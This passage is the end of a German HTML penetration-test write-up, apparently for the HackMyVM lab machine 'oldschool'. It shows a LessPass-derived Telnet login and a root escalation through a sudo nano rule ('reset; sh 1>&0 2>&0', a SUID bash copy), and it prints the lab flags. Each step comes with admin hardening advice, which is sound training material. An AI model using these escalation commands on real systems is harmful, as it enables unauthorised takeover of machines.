+              <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Fund!** LessPass ist ein deterministischer Passwort-Generator. Mit der Seite (`oldschool.hmv`), dem Benutzernamen (`fanny`) und dem Master-Passwort/Seed (`14mw0nd32fu1`) kann das tatsächliche Passwort für `fanny` auf diesem System generiert werden.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Gehen Sie auf die LessPass-Website (oder verwenden Sie ein Offline-Tool) und geben Sie die drei Informationen (Site: `oldschool.hmv`, Login: `fanny`, Master Password: `14mw0nd32fu1`) ein, um das Passwort für `fanny` zu generieren. Versuchen Sie dann, sich mit diesem Passwort per Telnet anzumelden.<br/><strong>Empfehlung (Admin):</strong> Verwenden Sie keine Passwort-Manager oder Generatoren, deren Master-Passwörter oder Seeds unsicher gespeichert werden. TFTP absichern. Sensible Konfigurationsdateien schützen.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre>
+https://www.lesspass.com/#/
+
+<span class="password">44Tg".P0/jKo_'t:</span>
+</pre>
+                   </div>
+               </div>
+               <p class="analysis"><strong>Analyse:</strong> Die LessPass-Website wurde verwendet, um mit den Informationen aus `passwd.cfg` das Passwort für `fanny@oldschool.hmv` zu generieren. Das Ergebnis ist `<span class="password">44Tg".P0/jKo_'t:</span>`.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Das Passwort für den Benutzer `fanny` wurde erfolgreich ermittelt.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Login via Telnet als `fanny`.<br/><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung.</p>
+
+        </section>
+
+        <section id="user-access-telnet">
+            <h2>User Access (Telnet)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet 192.168.2.126</span></div>
+                     <pre>
+Trying 192.168.2.126...
+Connected to 192.168.2.126.
+Escape character is '^]'.
+Debian GNU/Linux 11
+~
+oldschool.hmv login: <span class="command">fanny</span>
+Password: <span class="password">44Tg".P0/jKo_'t:</span>
+~
+Linux oldschool.hmv 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+
+[...]
+Last login: Sun Dec 11 18:18:59 CET 2022 from 192.168.0.29 on pts/1
+<span class="prompt">fanny@oldschool:~$</span> </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine Telnet-Verbindung zum Ziel wird aufgebaut. Der Benutzername `fanny` und das über LessPass generierte Passwort `<span class="password">44Tg".P0/jKo_'t:</span>` werden eingegeben. Der Login ist erfolgreich, und eine Shell als Benutzer `fanny` wird erhalten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Benutzerzugriff erfolgreich!** Durch Ausnutzung des ungesicherten TFTP-Servers und des LessPass-Seeds konnte Zugang als `fanny` erlangt werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumerieren Sie als `fanny`. Suchen Sie die User-Flag. Überprüfen Sie `sudo -l` auf Möglichkeiten zur Root-Eskalation.<br/><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Telnet. Sichern Sie TFTP. Ändern Sie das Master-Passwort/Seed für LessPass oder verwenden Sie sicherere Passwort-Management-Strategien. Ändern Sie das Passwort von `fanny`.</p>
+
+        </section>
+
+        <section id="privilege-escalation-root">
+            <h2>Privilege Escalation (Root via Sudo/Nano)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">fanny@oldschool:~$</span> <span class="command">sudo -l</span></pre>
+                     <pre>
+Matching Defaults entries for fanny on oldschool:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fanny may run the following commands on oldschool:
+    <span class="command">(ALL : ALL) NOPASSWD: /usr/bin/nano /etc/snmp/snmpd.conf</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` zeigt, dass der Benutzer `fanny` den Texteditor `nano` verwenden darf, um die spezifische Datei `/etc/snmp/snmpd.conf` als jeder Benutzer (`ALL:ALL`), einschließlich `root`, ohne Passwort (`NOPASSWD`) zu bearbeiten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Klarer Weg zur Root-Eskalation!** Viele Texteditoren, einschließlich `nano`, erlauben das Ausführen von Befehlen aus dem Editor heraus. Wenn `nano` mit `sudo` (also als Root) gestartet wird, werden diese Befehle ebenfalls als Root ausgeführt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die bekannte `nano`-Privilege-Escalation-Technik:
+                 1. Starten Sie `nano` mit sudo: `sudo /usr/bin/nano /etc/snmp/snmpd.conf`.
+                 2. Drücken Sie `Ctrl+R` (Read File).
+                 3. Drücken Sie `Ctrl+X` (Execute Command).
+                 4. Geben Sie einen Befehl ein, der eine Root-Shell öffnet (z.B. `reset; sh 1>&0 2>&0` oder `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` gefolgt von `/tmp/rootbash -p`).
+                 5. Drücken Sie Enter.<br/>
+             <strong>Empfehlung (Admin):</strong> **Unsichere sudo-Regel sofort entfernen oder korrigieren!** Erlauben Sie niemals die Ausführung von Texteditoren mit `sudo`, insbesondere nicht mit `NOPASSWD` und auf beliebige Dateien (obwohl hier spezifisch, ist es immer noch gefährlich). Wenn ein Benutzer eine Konfigurationsdatei bearbeiten muss, verwenden Sie sicherere Methoden wie `sudoedit` oder dedizierte Konfigurationsmanagement-Tools.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer `fanny` ändert sein eigenes Passwort. Dies ist für die Eskalation nicht relevant.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">fanny@oldschool:~$</span> <span class="command">passwd</span></pre>
+                     <pre>
+Changing password for fanny.
+Current password: <span class="password">[Altes PW eingegeben]</span>
+New password: <span class="password">password123</span>
+Retype new password: <span class="password">password123</span>
+passwd: password updated successfully
+</pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die nächsten Schritte beschreiben die Ausführung des Nano-Exploits.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+1. <span class="prompt">fanny@oldschool:~$</span> <span class="command">sudo /usr/bin/nano /etc/snmp/snmpd.conf</span>
+
+2. <span class="command">STRG + R</span> , <span class="command">STRG + X</span>
+3. Command to execute: <span class="command">reset; sh 1>&0 2>&0</span>
+4. <span class="command">[ENTER]</span>
+
+5. im anschluss erscheint gleich nach dem Enter drücken ein
+   Raute Zeichen, das für root steht #
+   leicht zu übersehen
+
+Beispiel:  [ Executing... ]<span class="prompt">#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Schritte des Nano-Exploits werden korrekt beschrieben:
+                1. `nano` wird mit `sudo` gestartet.
+                2. `Ctrl+R` (Lesen) und dann `Ctrl+X` (Ausführen) werden gedrückt, um zur Befehlseingabe zu gelangen.
+                3. Der Befehl `reset; sh 1>&0 2>&0` wird eingegeben. `reset` setzt das Terminal zurück (optional, aber oft nützlich), `sh 1>&0 2>&0` startet eine Shell (`sh`) und leitet deren Standardausgabe (`1>`) und Standardfehler (`2>`) auf die Standardeingabe (`&0`) um, was eine interaktive Shell im aktuellen Terminal ermöglicht.
+                4. Nach Enter wird der Befehl als Root ausgeführt, und der Prompt ändert sich zu `#`, was die Root-Shell anzeigt. Der `id`-Befehl bestätigt `uid=0(root)`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Root-Zugriff erfolgreich erlangt!** Die unsichere `sudo`-Regel wurde erfolgreich über die Nano-Exploit-Technik ausgenutzt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Holen Sie die Root- und User-Flags.<br/><strong>Empfehlung (Admin):</strong> `sudo`-Regel für `nano` entfernen.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root werden nun die Flags ausgelesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="prompt">#</span> <span class="command">whoami</span></pre> <!-- Innerhalb der Nano-Shell -->
+                      <pre>root</pre>
+                      <pre><span class="prompt">#</span> <span class="command">cat /home/fanny/user.txt</span></pre>
+                      <pre><span class="password">a8a1d4b692341fc2c59ca33815fb59d6</span></pre>
+                      <pre><span class="prompt">#</span> <span class="command">bash</span></pre> <!-- Startet eine vollwertige Bash-Shell -->
+                      <pre><span class="prompt">root@oldschool:/home/fanny#</span> <span class="command">cd /root</span></pre>
+                      <pre><span class="prompt">root@oldschool:~#</span> <span class="command">ls</span></pre>
+                      <pre>root.txt</pre>
+                      <pre><span class="prompt">root@oldschool:~#</span> <span class="command">cat root.txt</span></pre>
+                      <pre><span class="password">2b812156175effb8b80c6a65f8ef3a21</span></pre>
+                  </div>
+              </div>
+             <p class="evaluation"><strong>Bewertung:</strong> User- und Root-Flags erfolgreich gefunden.</p>
+
+        </section>
+
+        <section id="poc-root">
+            <h2>Proof of Concept: Root Escalation (Sudo Nano)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Nach Erlangung des Zugriffs als Benutzer `fanny` (via Telnet und einem über TFTP/LessPass generierten Passwort) wurde durch `sudo -l` festgestellt, dass `fanny` den Befehl `/usr/bin/nano /etc/snmp/snmpd.conf` ohne Passwort als Root ausführen darf. Da `nano` das Ausführen externer Befehle erlaubt, konnte dies zur Erlangung einer Root-Shell missbraucht werden.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong> Zugriff als Benutzer `fanny`, unsichere `sudo`-Regel für `nano`.</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong>
+                1. Als Benutzer `fanny` anmelden.
+                2. `sudo /usr/bin/nano /etc/snmp/snmpd.conf` ausführen.
+                3. Im Nano-Editor: `Ctrl+R` drücken.
+                4. Im Nano-Editor: `Ctrl+X` drücken.
+                5. Am unteren Bildschirmrand ("Command to execute"): `reset; sh 1>&0 2>&0` eingeben und Enter drücken.
+            </p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Eine interaktive Shell mit Root-Rechten (`#` Prompt) wird im Terminal geöffnet.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Eine falsch konfigurierte `sudo`-Regel, die die Ausführung eines Editors mit Root-Rechten erlaubt, führt fast immer zu einer vollständigen Systemübernahme.<br/><strong>Empfehlungen:</strong> Konfigurieren Sie `sudo`-Regeln nach dem Prinzip der geringsten Rechte. Erlauben Sie niemals die Ausführung von Editoren oder Shells mit `sudo`, insbesondere nicht ohne Passwort. Verwenden Sie `sudoedit` für das sichere Bearbeiten von Dateien als anderer Benutzer.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/fanny/user.txt</div>
+                     <div class="flag-value"><span class="password">a8a1d4b692341fc2c59ca33815fb59d6</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">2b812156175effb8b80c6a65f8ef3a21</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. April 2023</p>
+    </footer>
+</body>
+</html>
